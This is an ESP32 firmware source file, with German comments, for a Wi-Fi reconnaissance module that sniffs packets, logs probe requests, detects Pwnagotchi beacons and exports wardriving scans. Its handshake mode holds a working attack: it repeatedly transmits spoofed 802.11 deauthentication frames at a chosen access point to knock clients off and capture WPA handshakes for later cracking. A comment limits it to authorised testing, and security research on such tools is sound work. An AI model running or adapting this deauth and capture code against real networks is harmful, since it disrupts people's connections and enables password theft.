// G4MEOVER — WiFi-Recon (Implementierung). Siehe wifi_recon.h.
// NUR fuer autorisierte Security-Tests / eigene Hardware / CTF.
#include "wifi_recon.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

#define RECON_DEFAULT_MS  30000u
#define RECON_HOP_MS        250u
#define RECON_DEAUTH_MS    2000u   // Handshake: Deauth-Intervall zum Erzwingen des Reauth
#define RECON_STATS_MS     3000u   // PacketMon: Statistik-Intervall

enum ReconMode { RC_NONE, RC_HANDSHAKE, RC_PROBE, RC_PACKETMON, RC_PWNA };

static volatile ReconMode s_mode = RC_NONE;
static uint8_t  s_espnowCh = 1;
static uint8_t  s_bssid[6] = {0};
static uint8_t  s_ch       = 1;      // aktueller/fester Kanal
static bool     s_hop      = true;   // hoppen? (Handshake = false)
static uint32_t s_until    = 0;
static uint32_t s_lastHop  = 0;
static uint32_t s_lastAux  = 0;      // Deauth- bzw. Statistik-Timer

static volatile uint32_t s_hits = 0;
static volatile uint32_t s_cMgmt = 0, s_cData = 0, s_cCtrl = 0;

// ---- Promiscuous-RX-Callback (laeuft im WiFi-Task; bewusst schlank) ----
static void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* fr = p->payload;
    int len = p->rx_ctrl.sig_len;
    if(len < 24) return;
    uint8_t ftype    = (fr[0] >> 2) & 0x3;
    uint8_t subtype  = (fr[0] >> 4) & 0xF;

    switch(s_mode) {
    case RC_PACKETMON:
        if(type == WIFI_PKT_MGMT) s_cMgmt++;
        else if(type == WIFI_PKT_DATA) s_cData++;
        else s_cCtrl++;
        break;
    case RC_HANDSHAKE:
        // EAPOL = Ethertype 0x888E im Data-Frame (LLC/SNAP). Heuristik: Muster 0x88 0x8E suchen.
        if(ftype == 2) {
            for(int i = 24; i + 1 < len && i < 60; i++) {
                if(fr[i] == 0x88 && fr[i + 1] == 0x8E) {
                    s_hits++;
                    Serial.printf("[HS] EAPOL #%lu ap=%02X:%02X:%02X:%02X:%02X:%02X len=%d\n",
                        (unsigned long)s_hits, fr[16], fr[17], fr[18], fr[19], fr[20], fr[21], len);
                    break;
                }
            }
        }
        break;
    case RC_PROBE:
        if(ftype == 0 && subtype == 4) {   // Probe Request
            uint8_t slen = (len > 25) ? fr[25] : 0;   // SSID-Tag: fr[24]=0x00, fr[25]=len
            char ssid[33]; uint8_t n = slen > 32 ? 32 : slen;
            if(fr[24] == 0x00 && 26 + n <= len) { memcpy(ssid, &fr[26], n); ssid[n] = 0; }
            else { ssid[0] = 0; }
            s_hits++;
            Serial.printf("[PROBE] %02X:%02X:%02X:%02X:%02X:%02X sucht '%s'\n",
                fr[10], fr[11], fr[12], fr[13], fr[14], fr[15], ssid[0] ? ssid : "(broadcast)");
        }
        break;
    case RC_PWNA:
        // Pwnagotchi sendet Beacons mit JSON-Payload. Heuristik: Beacon, dessen Nutzlast
        // ASCII "pwnd" oder ein '{' … '"name"' enthaelt.
        if(ftype == 0 && subtype == 8) {
            for(int i = 36; i + 4 < len && i < 220; i++) {
                if((fr[i]=='p'&&fr[i+1]=='w'&&fr[i+2]=='n'&&fr[i+3]=='d') ||
                   (fr[i]=='"'&&fr[i+1]=='n'&&fr[i+2]=='a'&&fr[i+3]=='m'&&i+4<len&&fr[i+4]=='e')) {
                    s_hits++;
                    Serial.printf("[PWNA] Pwnagotchi-Beacon #%lu von %02X:%02X:%02X:%02X:%02X:%02X\n",
                        (unsigned long)s_hits, fr[10], fr[11], fr[12], fr[13], fr[14], fr[15]);
                    break;
                }
            }
        }
        break;
    default: break;
    }
}

static void set_channel(uint8_t ch) {
    if(ch < 1) ch = 1; if(ch > 13) ch = 13;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void promisc_on() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_promiscuous(true);
}

// Deauth an s_bssid (broadcast-Client) — zwingt Clients zum Reauth => Handshake.
static void handshake_deauth() {
    uint8_t d[26] = {
        0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0x07,0x00 };
    memcpy(&d[10], s_bssid, 6); memcpy(&d[16], s_bssid, 6);
    for(int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_STA, d, sizeof(d), false);
}

static void start_common(ReconMode m, uint32_t dur_ms, bool hop, uint8_t fixedCh) {
    s_hits = s_cMgmt = s_cData = s_cCtrl = 0;
    s_hop = hop;
    s_ch = hop ? 1 : (fixedCh ? fixedCh : 1);
    set_channel(s_ch);
    promisc_on();
    s_until = millis() + (dur_ms ? dur_ms : RECON_DEFAULT_MS);
    s_lastHop = s_lastAux = millis();
    s_mode = m;
}

void wifi_recon_init(uint8_t espnow_channel) { s_espnowCh = espnow_channel ? espnow_channel : 1; }

void wifi_recon_handshake(const uint8_t bssid[6], uint8_t channel, uint32_t dur_ms) {
    memcpy(s_bssid, bssid, 6);
    start_common(RC_HANDSHAKE, dur_ms, false, channel);
}
void wifi_recon_probe(uint32_t dur_ms)      { start_common(RC_PROBE,     dur_ms, true, 0); }
void wifi_recon_packetmon(uint32_t dur_ms)  { start_common(RC_PACKETMON, dur_ms, true, 0); }
void wifi_recon_pwnagotchi(uint32_t dur_ms) { start_common(RC_PWNA,      dur_ms, true, 0); }

uint8_t wifi_recon_wardrive() {
    int n = WiFi.scanNetworks(false, true);
    if(n < 0) n = 0;
    // WiGLE-kompatibler CSV-Kopf (GPS leer — Heltec V3 hat kein GPS; Deck kann anreichern).
    Serial.println("MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type");
    for(int i = 0; i < n; i++) {
        Serial.printf("%s,%s,%s,,%d,%d,,,,,WIFI\n",
            WiFi.BSSIDstr(i).c_str(), WiFi.SSID(i).c_str(),
            WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "[OPEN]" : "[WPA]",
            WiFi.channel(i), WiFi.RSSI(i));
    }
    WiFi.scanDelete();
    set_channel(s_espnowCh);
    return n > 255 ? 255 : n;
}

void wifi_recon_stop() {
    if(s_mode == RC_NONE) return;
    s_mode = RC_NONE;
    esp_wifi_set_promiscuous(false);
    set_channel(s_espnowCh);       // Steuerkanal zurueck
    Serial.printf("Recon gestoppt (hits=%lu)\n", (unsigned long)s_hits);
}

void wifi_recon_tick() {
    if(s_mode == RC_NONE) return;
    uint32_t now = millis();
    if((int32_t)(now - s_until) >= 0) { wifi_recon_stop(); return; }

    if(s_hop && (now - s_lastHop) >= RECON_HOP_MS) {
        s_ch = (s_ch % 13) + 1; set_channel(s_ch); s_lastHop = now;
    }
    if(s_mode == RC_HANDSHAKE && (now - s_lastAux) >= RECON_DEAUTH_MS) {
        handshake_deauth(); s_lastAux = now;
    }
    if(s_mode == RC_PACKETMON && (now - s_lastAux) >= RECON_STATS_MS) {
        Serial.printf("[PKTMON] mgmt=%lu data=%lu ctrl=%lu (ch=%u)\n",
            (unsigned long)s_cMgmt, (unsigned long)s_cData, (unsigned long)s_cCtrl, s_ch);
        s_lastAux = now;
    }
}

bool     wifi_recon_busy() { return s_mode != RC_NONE; }
uint32_t wifi_recon_hits() { return s_hits; }

const char* wifi_recon_state_str() {
    switch(s_mode) {
        case RC_HANDSHAKE: return "HANDSHAKE";
        case RC_PROBE:     return "PROBE";
        case RC_PACKETMON: return "PKTMON";
        case RC_PWNA:      return "PWNA";
        default:           return "idle";
    }
}
